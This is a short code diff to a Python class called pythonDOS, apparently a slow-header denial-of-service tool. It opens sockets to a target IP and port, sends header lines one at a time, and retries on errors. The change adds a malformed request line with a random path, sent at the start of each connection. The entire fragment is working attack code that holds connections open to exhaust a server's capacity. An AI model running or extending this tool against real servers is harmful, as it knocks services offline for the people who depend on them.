@@ -20,6 +20,7 @@ class pythonDOS():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4)
             s.connect((self._ip, self._port))
+            s.send(self.getMessage("Get /?"))
             for header in self._headers:
                 s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
             return s
@@ -27,6 +28,9 @@ class pythonDOS():
             print("Error: "+str(se))
             time.sleep(0.5)
             return self.newSocket()
+
+    def getMessage(self, message):
+        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
 
 # Main function
 if __name__ == "__main__":
